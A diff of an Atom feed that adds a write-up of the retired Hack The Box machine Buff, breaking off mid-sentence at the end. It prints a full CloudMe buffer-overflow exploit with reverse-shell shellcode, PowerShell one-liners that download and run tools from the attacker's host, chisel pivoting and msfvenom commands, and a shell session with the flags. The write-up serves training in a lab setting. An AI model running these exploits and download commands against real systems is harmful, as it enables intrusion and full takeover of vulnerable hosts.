@@ -1,5 +1,222 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - maggick</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/maggick.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-11-10T20:55:00+01:00</updated><entry><title>HTB: Tabby</title><link href="https://maggick.fr/2020/11/htb-tabby.html" rel="alternate"></link><published>2020-11-10T20:55:00+01:00</published><updated>2020-11-10T20:55:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-11-10:/2020/11/htb-tabby.html</id><summary type="html">&lt;p&gt;&lt;img alt="Tabby Card" class="align-left" src="/media/2020.11/tabby_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - maggick</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/maggick.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-11-22T12:41:00+01:00</updated><entry><title>HTB: Buff</title><link href="https://maggick.fr/2020/11/htb-buff.html" rel="alternate"></link><published>2020-11-22T12:41:00+01:00</published><updated>2020-11-22T12:41:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-11-22:/2020/11/htb-buff.html</id><summary type="html">&lt;p&gt;&lt;img alt="Buff card" class="align-left" src="/media/2020.11/buff_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/263"&gt;Buff&lt;/a&gt; published on
+July 18 2020
+&lt;a href="https://www.hackthebox.eu/home/users/profile/94858"&gt;egotisticalSW&lt;/a&gt;
+This box is classified as an easy machine.
+The user part just require to exploit a CVE. The root part require first to
+pivot to access the box's internal services then exploit another CVE.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.11/buff_card.png" alt="Buff card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/263"&gt;Buff&lt;/a&gt; published on
+July 18 2020
+&lt;a href="https://www.hackthebox.eu/home/users/profile/94858"&gt;egotisticalSW&lt;/a&gt;
+This box is classified as an easy machine.
+The user part just require to exploit a CVE. The root part require first to
+pivot to access the box's internal services then exploit another CVE.&lt;/p&gt;
+
+
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;We start with an nmap scan. Despite being a Windows boxes, only a few services
+are exposed: A port 8080 for an HTTP service and a port 7680 (probably another
+HTB user port as we will see at the end of this writeup).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sat Jul 25 08:59:16 2020 as: nmap -p- -sSV -oN nmap 10.10.10.198&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.198&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.16s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65533 filtered ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT     STATE SERVICE    VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;7680/tcp open  pando-pub?&lt;/span&gt;
+&lt;span class="code-line"&gt;8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;The website is a promotional website for a Gym.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Buff homepage" src="/media/2020.11/buff_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;We browse the site and found the &lt;a href="http://10.10.10.198:8080/contact.php"&gt;contact page&lt;/a&gt;.
+On it we can read that the site was "Made using Gym Management Software 1.0".&lt;/p&gt;
+&lt;p&gt;Despite the site looking like a homemade site for the purpose of the box, this
+is really a public product with a exploit available.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ searchsploit Gym Management&lt;/span&gt;
+&lt;span class="code-line"&gt;------------------------------------------------ ---------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Exploit Title                                  |  Path&lt;/span&gt;
+&lt;span class="code-line"&gt;------------------------------------------------ ---------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Gym Management System 1.0 - Unauthenticated RCE | php/webapps/48506.py&lt;/span&gt;
+&lt;span class="code-line"&gt;------------------------------------------------ ---------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We run the exploit, see who we are and get the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ python2 48506.py http://10.10.10.198:8080/&lt;/span&gt;
+&lt;span class="code-line"&gt;            /\&lt;/span&gt;
+&lt;span class="code-line"&gt;/vvvvvvvvvvvv \--------------------------------------,&lt;/span&gt;
+&lt;span class="code-line"&gt;`^^^^^^^^^^^^ /============BOKU=====================&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;            \/&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[+] Successfully connected to webshell.&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\xampp\htdocs\gym\upload&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\xampp\htdocs\gym\upload&amp;gt; whoami&lt;/span&gt;
+&lt;span class="code-line"&gt;�PNG&lt;/span&gt;
+&lt;span class="code-line"&gt;�&lt;/span&gt;
+&lt;span class="code-line"&gt;buff\shaun&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\xampp\htdocs\gym\upload&amp;gt; type &amp;quot;C:\Users\shaun\Desktop\user.txt&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;�PNG&lt;/span&gt;
+&lt;span class="code-line"&gt;�&lt;/span&gt;
+&lt;span class="code-line"&gt;6c675c6c581ec9341b8ed8717c537e32&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="root"&gt;root&lt;/h1&gt;
+&lt;p&gt;We can use our limited shell to download exec from our kali box (running a
+simple python HTTP server) and execute them. For instance we can run
+&lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS"&gt;winPEAS&lt;/a&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\xampp\htdocs\gym\upload&amp;gt; powershell -exec bypass -c &amp;quot;(New-Object System.Net.WebClient).DownloadFile(&amp;#39;http://10.10.14.24:8080/winPEAS.exe&amp;#39;, &amp;#39;.\winPEAS.exe&amp;#39;)&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\xampp\htdocs\gym\upload&amp;gt; .\winPEAS.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="cloudme"&gt;Cloudme&lt;/h2&gt;
+&lt;p&gt;Still browsing our user's folders we found an specific binary in &lt;code&gt;Downloads&lt;/code&gt;:
+&lt;code&gt;CloudMe_1112.exe&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\xampp\htdocs\gym\upload&amp;gt; dir &amp;quot;C:\Users\Shaun\Downloads&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;�PNG&lt;/span&gt;
+&lt;span class="code-line"&gt;�&lt;/span&gt;
+&lt;span class="code-line"&gt;Volume in drive C has no label.&lt;/span&gt;
+&lt;span class="code-line"&gt;Volume Serial Number is A22D-49F7&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Directory of C:\Users\Shaun\Downloads&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;14/07/2020  13:27    &amp;lt;DIR&amp;gt;          .&lt;/span&gt;
+&lt;span class="code-line"&gt;14/07/2020  13:27    &amp;lt;DIR&amp;gt;          ..&lt;/span&gt;
+&lt;span class="code-line"&gt;16/06/2020  16:26        17,830,824 CloudMe_1112.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;              1 File(s)     17,830,824 bytes&lt;/span&gt;
+&lt;span class="code-line"&gt;              2 Dir(s)   9,639,174,144 bytes free&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This also is a public software with some exploit available. For our specific
+version (1.11.2), only four exploits applies.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ searchsploit cloudme&lt;/span&gt;
+&lt;span class="code-line"&gt;---------------------------------------------- ---------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Exploit Title                                |  Path&lt;/span&gt;
+&lt;span class="code-line"&gt;---------------------------------------------- ---------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;CloudMe 1.11.2 - Buffer Overflow (PoC)        | windows/remote/48389.py&lt;/span&gt;
+&lt;span class="code-line"&gt;CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASL | windows/local/48499.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Cloudme 1.9 - Buffer Overflow (DEP) (Metasplo | windows_x86-64/remote/45197.rb&lt;/span&gt;
+&lt;span class="code-line"&gt;CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(D | windows_x86-64/local/45159.py&lt;/span&gt;
+&lt;span class="code-line"&gt;CloudMe Sync 1.10.9 - Stack-Based Buffer Over | windows/remote/44175.rb&lt;/span&gt;
+&lt;span class="code-line"&gt;CloudMe Sync 1.11.0 - Local Buffer Overflow   | windows/local/44470.py&lt;/span&gt;
+&lt;span class="code-line"&gt;CloudMe Sync 1.11.2 - Buffer Overflow + Egghu | windows/remote/46218.py&lt;/span&gt;
+&lt;span class="code-line"&gt;CloudMe Sync 1.11.2 Buffer Overflow - WoW64 ( | windows_x86-64/remote/46250.py&lt;/span&gt;
+&lt;span class="code-line"&gt;CloudMe Sync &amp;lt; 1.11.0 - Buffer Overflow       | windows/remote/44027.py&lt;/span&gt;
+&lt;span class="code-line"&gt;CloudMe Sync &amp;lt; 1.11.0 - Buffer Overflow (SEH) | windows_x86-64/remote/44784.py&lt;/span&gt;
+&lt;span class="code-line"&gt;---------------------------------------------- ---------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;But as we saw earlier only the port 8080 is open on the box. The &lt;code&gt;CloudMe&lt;/code&gt;
+software is only running locally on the box. We need to use some pivoting
+technique to access the internal box services in order to use the exploit
+&lt;code&gt;44470.py&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;#######################################################&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Exploit Title: Local Buffer Overflow on CloudMe Sync v1.11.0&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Date: 08.03.2018&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Vendor Homepage: https://www.cloudme.com/en&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Software Link: https://www.cloudme.com/downloads/CloudMe_1110.exe&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Category: Local&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Exploit Discovery: Prasenjit Kanti Paul&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Web: http://hack2rule.wordpress.com/&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Version: 1.11.0&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Tested on: Windows 7 SP1 x86&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# CVE: CVE-2018-7886&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Solution: Update CloudMe Sync to 1.11.2&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#######################################################&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#Disclosure Date: March 12, 2018&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#Response Date: March 14, 2018&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#Bug Fixed: April 12, 2018&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Run this file in victim&amp;#39;s win 7 sp1 x86 system where CloudMe Sync 1.11.0 has been installed.&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;junk&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;1052&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;eip&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x7B\x8A\xA9\x68&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;      &lt;span class="c1"&gt;#68a98a7b : JMP ESP - Qt5Core.dll&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.1 LPORT=4444 -f c&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0e\x18\x68&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;junk&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;eip&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;8888&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="chisel"&gt;chisel&lt;/h2&gt;
+&lt;p&gt;We will use &lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md#chisel"&gt;chisel&lt;/a&gt;
+in order to access &lt;code&gt;CloudMe&lt;/code&gt; service.&lt;/p&gt;
+&lt;p&gt;On our kali we run &lt;code&gt;chisel&lt;/code&gt; in server mode.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;./chisel_1.6.0_linux_amd64 server -p 9001 -reverse&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Using our limited shell we download our &lt;code&gt;chisel&lt;/code&gt; binary on the box and run it as
+client on port &lt;code&gt;8888&lt;/code&gt; (remember this strange open port on the nmap scan?) as
+CloudMe is also running on port 8888 (as stated on the exploit &lt;code&gt;44770.py&lt;/code&gt;).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\xampp\htdocs\gym\upload&amp;gt; powershell -exec bypass -c &amp;quot;(New-Object System.Net.WebClient).DownloadFile(&amp;#39;http://10.10.14.24:8080/chisel.exe&amp;#39;, &amp;#39;.\chisel.exe&amp;#39;)&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\xampp\htdocs\gym\upload&amp;gt; .\chisel.exe client 10.10.14.24:9001 R:8888:localhost:8888&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The exploit &lt;code&gt;44770.py&lt;/code&gt; also told us to generate a new shellcode using
+&lt;code&gt;msfvenom&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f c&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We update the script with our shell code, configure the &lt;code&gt;metasploit&lt;/code&gt; handler and
+run it as well as the exploit script (with &lt;code&gt;python 44470.py&lt;/code&gt;) . We got a shell as &lt;code&gt;administrator&lt;/code&gt; and can
+get the root flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 exploit(multi/handler) &amp;gt; run&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Started reverse TCP handler on 10.10.14.24:4444&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Command shell session 1 opened (10.10.14.24:4444 -&amp;gt; 10.10.10.198:53234) at 2020-07-25 12:07:33 -0400&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;whoami&lt;/span&gt;
+&lt;span class="code-line"&gt;whoami&lt;/span&gt;
+&lt;span class="code-line"&gt;buff\administrator&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Windows\system32&amp;gt;type C:\Users\Administrator\Desktop\root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;type C:\Users\Administrator\Desktop\root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;4ea57b2b8df4db2ea72531bcc50c5a86&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;This box was really quick as it only require to exploit two CVE. The pivoting
